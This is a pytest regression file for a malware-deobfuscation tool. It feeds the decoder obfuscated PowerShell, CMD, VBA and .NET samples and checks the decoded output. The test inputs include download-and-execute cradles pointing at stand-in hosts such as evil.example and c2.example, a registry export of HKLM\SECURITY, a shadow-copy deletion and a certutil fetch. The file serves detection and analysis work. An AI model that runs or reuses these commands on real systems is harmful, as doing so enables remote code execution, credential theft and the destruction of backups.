"""Regression tests for the 12 Feb-2026 research-backed archetypes.

Sources — /app/memory/RESEARCH_REFERENCES.md
  · Bohannon & Holmes  BlackHat US-17
  · Deep Instinct 2025 "Excel(ent) Obfuscation"
  · dr4k0nia         2022 "String Obfuscation The Malware Way"

Each test drives the archetype through the top-level try_archetypes() so
we exercise the same code path used by /api/decode/smart and /api/decode/chain.
"""
from __future__ import annotations

import pytest

from wrapper_archetypes import try_archetypes, ARCHETYPES


# ─── Sanity: registry integrity ─────────────────────────────────────────
_EXPECTED_IDS = {
    "PS_TICK_OBFUSC",
    "CMD_ENVVAR_SPLIT_POWERSHELL",
    "PS_GET_COMMAND_WILDCARD",
    "PS_SPLIT_JOIN_DELIM",
    "PS_REPLACE_JUNK",
    "PS_ARRAY_REVERSE_JOIN",
    "PS_REGEX_REVERSE",
    "PS_SCRIPTBLOCK_CREATE",
    "PS_CLIPBOARD_IEX",
    "EXCEL_REGEX_OBFUSC",
    "DOTNET_HOMOGLYPH_REPLACE",
    "DOTNET_STRING_REMOVE",
}


def test_all_new_archetypes_registered() -> None:
    registered = {a["id"] for a in ARCHETYPES}
    missing = _EXPECTED_IDS - registered
    assert not missing, f"archetypes missing from registry: {missing}"


# ─── Bohannon · Tick obfuscation ────────────────────────────────────────
def test_ps_tick_obfusc_downloadstring() -> None:
    src = (
        "powershell -c \"(New-Object Net.WebClient)."
        "`D`o`w`n`l`o`a`d`S`t`r`i`n`g('http://evil.example/x.ps1')\""
    )
    r = try_archetypes(src)
    assert r and "DownloadString" in r["output"]
    assert "`D`o`w`n" not in r["output"]


def test_ps_tick_obfusc_iex() -> None:
    r = try_archetypes("`I`E`X (`N`e`w`-`O`b`j`e`c`t Net.WebClient)")
    assert r and "IEX" in r["output"] and "New-Object" in r["output"]


# ─── Bohannon · CMD env-var split ───────────────────────────────────────
def test_cmd_envvar_split_reconstructs_powershell() -> None:
    src = (
        'cmd /c "set p1=power&& set p2=shell&& '
        'cmd /c echo Write-Host SUCCESS ^| %p1%%p2% -"'
    )
    r = try_archetypes(src)
    assert r, "archetype did not fire"
    assert "powershell" in r["output"].lower()


def test_cmd_envvar_split_fin8_flavour() -> None:
    src = (
        'set _MICROSOFT_UPDATE_CATALOG=IEX (iwr http://c2.example/x.ps1)&& '
        'set _MICROSOFT_UPDATE_SERVICE=powershell -&& '
        'cmd /c echo %_MICROSOFT_UPDATE_CATALOG% | %_MICROSOFT_UPDATE_SERVICE%'
    )
    r = try_archetypes(src)
    assert r and "IEX (iwr http://c2.example/x.ps1)" in r["output"]
    assert "powershell" in r["output"].lower()


# ─── Bohannon · Wildcard cmdlet resolve ────────────────────────────────
def test_ps_gcm_wildcard_annotates_new_object() -> None:
    src = '& (GCM *w-O*) "Net.WebClient"'
    r = try_archetypes(src)
    assert r
    body = r["output"]
    assert "New-Object" in body
    assert "NIVX_DEOBFUSC" in body


# ─── Bohannon · Split-join delimiter ────────────────────────────────────
def test_ps_split_join_strips_tilde_delim() -> None:
    src = (
        "$c=\"(New-Object Net.We~~bClient).Downlo~~adString('http://c2.example/x')\";"
        " IEX ($c.Split(\"~~\") -Join '')"
    )
    r = try_archetypes(src)
    assert r
    assert "Net.WebClient" in r["output"]
    assert "DownloadString" in r["output"]


# ─── Bohannon · Replace junk ────────────────────────────────────────────
def test_ps_replace_junk_strips_marker() -> None:
    src = (
        "$c=\"IEX (New-Ob~~ject Net.We~~bClient).Downlo~~adString('http://c2/y')\"; "
        "& $c.Replace(\"~~\",\"\")"
    )
    r = try_archetypes(src)
    assert r
    assert "New-Object" in r["output"]
    assert "WebClient" in r["output"]


# ─── Bohannon · Array reverse ───────────────────────────────────────────
def test_ps_array_reverse_join_recovers_iex() -> None:
    src = (
        "$c=\"noisserpxE-ekovnI\".ToCharArray(); "
        "[Array]::Reverse($c); ($c -Join '') | IEX"
    )
    r = try_archetypes(src)
    assert r and "Invoke-Expression" in r["output"]


# ─── Bohannon · Regex right-to-left reversal ────────────────────────────
def test_ps_regex_reverse_recovers_downloadstring() -> None:
    reversed_body = ")'t1g3L/yl.tib//:sptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN("
    src = f"IEX (-Join[RegEx]::Matches(\"{reversed_body}\",'.','RightToLeft')) | IEX"
    r = try_archetypes(src)
    assert r
    assert "DownloadString" in r["output"]
    assert "bit.ly/L3g1t" in r["output"]


# ─── Bohannon · ScriptBlock::Create ─────────────────────────────────────
def test_ps_scriptblock_create_lifts_body() -> None:
    src = (
        "& [Scriptblock]::Create(\"Write-Host CB_Executed; "
        "iex((New-Object Net.WebClient).DownloadString('http://c2/y'))\")"
    )
    r = try_archetypes(src)
    assert r
    assert "Write-Host CB_Executed" in r["output"]
    assert "DownloadString" in r["output"]


# ─── Bohannon · Clipboard cradle ────────────────────────────────────────
def test_ps_clipboard_iex_annotates() -> None:
    src = (
        "powershell -c \"[void][System.Reflection.Assembly]::LoadWithPartialName"
        "('System.Windows.Forms'); IEX ([System.Windows.Forms.Clipboard]::GetText())\""
    )
    r = try_archetypes(src)
    assert r
    assert "Bohannon" in r["output"] or "Clipboard" in r["output"]


# ─── Deep Instinct · Excel REGEXEXTRACT ────────────────────────────────
def test_excel_regex_obfusc_flags_vba() -> None:
    src = """
    Sub Auto_Open()
        Dim shellObj As String
        shellObj = getval0()
        CreateObject(shellObj).Run "powershell -c ..."
    End Sub
    Function getval0() As String
        getval0 = Application.WorksheetFunction.RegexExtract(Range("A1").Value, "WSc[a-z]+\\\\.Sh[a-z]+")
    End Function
    """
    r = try_archetypes(src)
    assert r
    body = r["output"]
    assert "Deep Instinct" in body
    assert "REGEXEXTRACT" in body or "REGEX" in body


# ─── dr4k0nia · Homoglyph replace ───────────────────────────────────────
def test_dotnet_homoglyph_normalises_cyrillic() -> None:
    # Cyrillic а (U+0430), е (U+0435), і (U+0456), о (U+043E), с (U+0441)
    src = (
        'public string GetC2() { return "httpsа://c2.exаmple/x".Replace("а", ""); }'
    )
    r = try_archetypes(src)
    assert r
    body = r["output"]
    assert "c2.example" in body  # homoglyph normalised
    assert "\u0430" not in body   # Cyrillic а eliminated


# ─── dr4k0nia · Chained .Remove(i, l) ───────────────────────────────────
def test_dotnet_string_remove_annotates() -> None:
    src = (
        'string secret = "httpArrayList://c2.exStreamReadermple/xInt32"'
        '.Remove(4, 9).Remove(15, 12).Remove(21, 5);'
    )
    r = try_archetypes(src)
    assert r
    assert "dr4k0nia" in r["output"] or "MurkyStrings" in r["output"]


# ─── Regression: pre-existing archetypes still fire ─────────────────────
def test_regression_existing_ps_reverse_string() -> None:
    r = try_archetypes("-join ('noisserpxE-ekovnI'[-1..-17])")
    assert r and "Invoke-Expression" in r["output"]


def test_regression_existing_vbs_chr_concat() -> None:
    r = try_archetypes("MsgBox Chr(72)&Chr(101)&Chr(108)&Chr(108)&Chr(111)")
    assert r and "Hello" in r["output"]


# ─── Feb-2026 · PS_FROMBASE64_ASCII_FROMHEX nested chain ────────────────
def test_nested_b64_hex_ascii_all_four_layers() -> None:
    src = (
        "powershell -NoP -C \"iex([System.Text.Encoding]::ASCII.GetString("
        "[System.Convert]::FromHexString(([System.Text.Encoding]::ASCII.GetString("
        "[System.Convert]::FromBase64String('TkRreE5VVTFPREl3TWpRNU1rVXdNVFE1"
        "TkRreE5VVTFPREl3TWpRNU1rVT0='))))))\""
    )
    r = try_archetypes(src)
    assert r
    assert r["archetype_id"] == "PS_FROMBASE64_ASCII_FROMHEX"
    body = r["output"]
    assert "Layer 1" in body
    assert "Layer 4" in body
    assert "FromBase64String input" in body
    # The nested payload double-encodes b64 → we must detect it
    assert "double-b64" in body
    # Final hex decodes to a known 16-byte pattern
    assert "4915e58202492e01494915e58202492e" in body.lower()


# ─── Feb-2026 · NATIVE_CMD_EXPLAINER (plain LOLBAS breakdown) ───────────
def test_native_cmd_reg_export_breakdown() -> None:
    r = try_archetypes(r"reg.exe export HKLM\SECURITY C:\Windows\Temp\sec.reg /y")
    assert r
    assert r["archetype_id"] == "NATIVE_CMD_EXPLAINER"
    out = r["output"]
    assert "Export Windows Registry Hive" in out
    assert r"HKLM\SECURITY" in out
    assert r"C:\Windows\Temp\sec.reg" in out
    assert "Force/Overwrite" in out
    assert "T1003.002" in out


def test_native_cmd_vssadmin_shadows() -> None:
    r = try_archetypes("vssadmin delete shadows /all /quiet")
    assert r
    assert r["archetype_id"] == "NATIVE_CMD_EXPLAINER"
    assert "Volume Shadow-Copy Deletion" in r["output"]
    assert "T1490" in r["output"]


# ─── PS_FromBase64String_ASCII correctly detected (not misclassified) ───
def test_ps_fb64_ascii_not_utf16() -> None:
    src = (
        "[System.Text.Encoding]::ASCII.GetString("
        "[System.Convert]::FromBase64String('SGVsbG8gV29ybGQh'))"
    )
    r = try_archetypes(src)
    assert r
    # Should NOT be classified as UTF16LE for ASCII payloads
    assert r["archetype_id"] == "PS_FromBase64String_ASCII"
    assert "Hello World!" in r["output"]


# ─── Feb 2026 · Batch-CSV row fixes ─────────────────────────────────────
def test_ps_base64_xor_byte_iex_row0009() -> None:
    src = ('powershell -C "$b=[Convert]::FromBase64String(\'S0tLSk9JSUpLS0tMVE9XU1ZPTUtMVE9X\');'
           '$x=$b|%{$_-xor0x23};iex([Text.Encoding]::ASCII.GetString($x))"')
    r = try_archetypes(src)
    assert r and r["archetype_id"] == "PS_BASE64_XOR_BYTE_IEX"
    out = r["output"]
    assert "XOR key" in out
    assert "0x23" in out


def test_ps_sal_alias_resolver_row0015() -> None:
    src = ("powershell -nop -c \"sal i Invoke-WebRequest; i 'http://8.8.8' "
           "-OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe\"")
    r = try_archetypes(src)
    assert r and r["archetype_id"] == "PS_SAL_ALIAS_RESOLVER"
    assert "Invoke-WebRequest" in r["output"]
    assert "i  →  Invoke-WebRequest" in r["output"] or "i → Invoke-WebRequest" in r["output"]


def test_ps_envvar_method_chain_row0011() -> None:
    src = ('cmd.exe /c "set a=Down&& set b=load&& set c=String&& '
           "powershell -C IEX (New-Object Net.WebClient).$env:a$env:b$env:c('http://10.0.4')\"")
    r = try_archetypes(src)
    assert r and r["archetype_id"] == "PS_ENVVAR_METHOD_CHAIN"
    assert "$env:a" in r["output"]  # banner
    # After resolution, the method-name should include the resolved parts
    out = r["output"]
    assert "Down" in out and "load" in out and "String" in out


def test_ps_reverse_tochararray_row0010() -> None:
    src = (
        "powershell -NoProfile -ExecutionPolicy Bypass -Command "
        "\"$c='1sp.tcafitradadba/moc.niatpacyM//:ptth gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(XEI';"
        "iex(($c.ToCharArray()|?{$_})[-1..-($c.Length)]-join'')\""
    )
    r = try_archetypes(src)
    assert r and r["archetype_id"] == "PS_REVERSE_STRING"
    # Reversed body should surface the http URL
    assert "http://Mycaptain.com/abdadartifact.ps1" in r["output"]


def test_ioc_extracts_url_hostname_regardless_of_tld() -> None:
    """Feb-2026 fix: hostnames from URLs get extracted even when the TLD is
    not on the real-TLD allow-list (e.g. .example, .test, or a rare TLD)."""
    from operations import extract_iocs
    r = extract_iocs("certutil -urlcache -split -f http://evil.example/x.exe C:\\temp\\x.exe")
    assert "http://evil.example/x.exe" in r["urls"]
    assert "evil.example" in r["domains"]


def test_ps_encodedcommand_mixed_encoding_falls_back():
    """Row-0001 style: corrupt payload where UTF-16LE decode partly succeeds
    but produces Han-ideograph glyphs — we should show BOTH interpretations
    or pick the higher-score UTF-8 candidate."""
    src = "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAaGVsbG8nAA=="
    r = try_archetypes(src)
    assert r and r["archetype_id"] == "PS_EncodedCommand"
    # The literal 'hello' bytes are present in the raw payload — UTF-8
    # fallback should surface them.
    out = r["output"]
    assert "hello" in out or "encoding-mixed" in out.lower()
